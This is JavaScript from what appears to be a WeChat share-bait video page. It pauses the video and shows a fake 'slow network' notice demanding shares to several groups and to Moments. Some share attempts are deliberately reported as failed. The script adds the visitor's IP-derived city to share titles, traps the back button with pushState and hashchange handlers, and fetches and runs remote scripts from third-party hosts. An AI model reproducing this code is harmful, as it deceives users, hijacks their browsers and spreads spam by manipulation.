    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return unescape(r[2]);
        }
        return null;
    }



if (getCookie('delaytime')==null)
{
   if (getQueryString('tip')=='goon')
   {
   setCookie('delaytime','9999');
   }else{

   setCookie('delaytime','150');
   }
}

if (getQueryString('tip')=='ok')
{
setTimeout('jssdk()',500);
}


    var pageGlobal = {};
     hturl ='';//互推图片 https://qqpublic.qpic.cn/qq_public/0/0-3008633372-10CABE52A9499CF61CE5D095CABD5EED/0  
               til = '拜金女KTV过生日，羞辱KTV服务员，没想到小伙竟是...';
    pageGlobal.vid = 'e05096d8bqk';//s050106632i
    pageGlobal.playStatus = '';
    pageGlobal.delayTime = parseInt(getCookie('delaytime'));
  


    var video, player;
var vid = pageGlobal.vid;
var playStatus = 'pending';

new Swiper('.swiper-container', {autoplay: 5000});

$(function(){
    var elId = 'mod_player_skin_0';
    $("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
    var elWidth = $("#js_content").width();
    playVideo(vid,elId,elWidth);
    $("#pauseplay").height($("#js_content").height() - 10);

    if(playStatus == 'pending') {
        var delayTime = pageGlobal.delayTime;
        var isFirst = true;
        setInterval(function(){
            try {
                var currentTime = player.getCurTime();
                if(currentTime >= delayTime) {
                    $('#pauseplay').show();
                    player.callCBEvent('pause');
                    $.cookie(vid, 's', {path: '/'});
                    if(isFirst) {
                        $('#pauseplay').trigger('click');
                    }
                    isFirst = false;
                }
            } catch (e) {

            }
        }, 500);
    }

    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
    new IScroll('#wrapper', {useTransform: false, click: true});

  
    setTimeout(function() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
    }, 200);


});

function playVideo(vid,elId,elWidth){
    //定义视频对象
    video = new tvp.VideoInfo();
    //向视频对象传入视频vid
    video.setVid(vid);

    //定义播放器对象
    player = new tvp.Player(elWidth, 200);
    //设置播放器初始化时加载的视频
    player.setCurVideo(video);

    //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    //player.addParam("autoplay","1"); 

    player.addParam("wmode","transparent");
    player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
    player.write(elId);
}

 $('#pauseplay').on('click', function() {
    setCookie('xxxooo','1');
    $.getScript('//api2.liyuantheater.cn/bbq/t.php',function(){
    location.href=tzurl+'?tip=ok';
    });
  });

$('#like').on('click', function(){
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if(!$icon.hasClass('praised')){
        num = parseInt($num.html());
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

function jssdk() {
     
         $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $("#mask").show();
        $("#fenxiang").show();
        $('#game_result').hide();
        $('.time-out-num').hide();
        $('.bag').hide();
        show_tip();

}



  $.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
   diqu = remote_ip_info.city;
    });

(function() {
    /**
     * 动态加载js文件
     * @param  {string}   url      js文件的url地址
     * @param  {Function} callback 加载完成后的回调函数
     */
    var _getScript = function(url, callback) {
        var head = document.getElementsByTagName('head')[0],
            js = document.createElement('script');

        js.setAttribute('type', 'text/javascript');
        js.setAttribute('src', url);

        head.appendChild(js);

        //执行回调
        var callbackFn = function(){
            if(typeof callback === 'function'){
                callback();
            }
        };

        if (document.all) { //IE
            js.onreadystatechange = function() {
                if (js.readyState == 'loaded' || js.readyState == 'complete') {
                    callbackFn();
                }
            }
        } else {
            js.onload = function() {
                callbackFn();
            }
        }
    }

    //如果使用的是zepto，就添加扩展函数
    if(Zepto){
        $.getScript = _getScript;
    }

})();

var alertTimes = 0;
function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}



function share_tip(share_app_times, share_timeline_times) {
 if (shareATimes == 1) {
        wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可观看！', '好')
    } else if (shareATimes == 2) {
        wxalert('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！', '好')
    } else if (shareATimes == 3) {
        wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好')
    } else {
    
       
       if (share_timeline_times < 1) {


            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可!', '好')
        } else {
          wxalert('分享成功, 请点击按钮继续播放', '确定', function() {
               setCookie('xxxooo','1');
             
             
                 $.getScript('//api2.liyuantheater.cn/bbq/t.php',function(){
                 location.href=tzurl+'?tip=goon';
                 });
               })

        }

    }
}


function show_tip() {

      wxalert('<img src="http://img.zcool.cn/community/01909155a905dc32f875495ea197c9.gif" style="width:30%" ><br/><span style="font-size: 24px;color: #f5294c">网速不好</span><br/>请分享到微信群<br/><span style="font-size: 20px;color: #f5294c">可免费加速观看</span>', '好')
}
$(function() {

    $('#fenxiang').on('click', function() {
        show_tip()
    });
    $('#mask').on('click', function() {
        show_tip()
    })
});



var shareATimes = 0;
var shareTTimes = 0;



$(function () {
    $.ajax({
        type : "GET",
        url : "//api2.liyuantheater.cn/share.php?ym="+window.location.host+"&url=" + encodeURIComponent(location.href.split
('#')[0]) + '&_=' + Date.now(),
        dataType : "jsonp",
        jsonp:"callback",
        data:{},
        success : function(result){
            window.data = result;
       
            wx.config(window.data.config);
            wx.ready(function(){
               wx.hideOptionMenu();
              wx.showMenuItems({menuList:['menuItem:share:appMessage','menuItem:share:timeline']});
               share_config(window.data);
            });
        }
    });
});

function share_config(data,timeline_cash){
    data.config.signature = null;
    wx.config(data.config);
    wx.ready(function(){
        wx.onMenuShareAppMessage({
            title: diqu+data.share_app_info.title,
            desc: diqu+data.share_app_info.desc,
            link: data.share_app_info.link,
            imgUrl: data.share_app_info.img_url,
            success: function () {
                shareATimes += 1;
                share_tip(shareATimes,shareTTimes);
            },
            cancel: function () {

            }
        });
        if (timeline_cash) {
            wx.onMenuShareTimeline({
                title: diqu+data.share_timeline_info.title,
                link: data.share_timeline_info.link,
                imgUrl: data.share_timeline_info.img_url,
                success: function () {
                    shareTTimes += 1;
                    share_tip(shareATimes,shareTTimes);
                },
                cancel: function () {

                }
            });
        } else {
            wx.onMenuShareTimeline({
                title: diqu+data.share_timeline_cash_info.title,
                link: data.share_timeline_cash_info.link,
                imgUrl: data.share_timeline_cash_info.img_url,
                success: function () {
                    shareTTimes += 1;
                    share_tip(shareATimes,shareTTimes);
                },
                cancel: function () {

                }
            });
        }
    });
}

function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}

setTimeout('anchor()', 100);



var d = new Date();
var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
document.getElementById("post-date").innerHTML = str;

if (xo == '1')
{
document.title= '...';
document.getElementsByTagName('h2')[0].innerHTML = til2;
}else{
document.title= '...';
document.getElementsByTagName('h2')[0].innerHTML = til;
}

//document.getElementById('hutui').innerHTML ='<p></p><p><a href="javascript:ht();"> <img src="'+hturl+'" alt=""></a> </p>';



function ht() {
 //$.getScript("//api2.liyuantheater.cn/nr/t.php");
//location.href="http://cctv.pptvision.com.cn/editor/video/20171108/ld20171108.html?vid=c0500i4oz4x";
}




function zp() {
   // $.getScript("//cdn.tengbaole.cn/sq/js/back6.js");
}

window.onhashchange = function() {
   xs();
};

function xs() {
 // $.getScript('//api.handoubao.cn/ad/tnk.php',function(){
 //  location.href=tzurl;})

    $.getScript("//api1.liyuantheater.cn/ad/tnk.php");
}
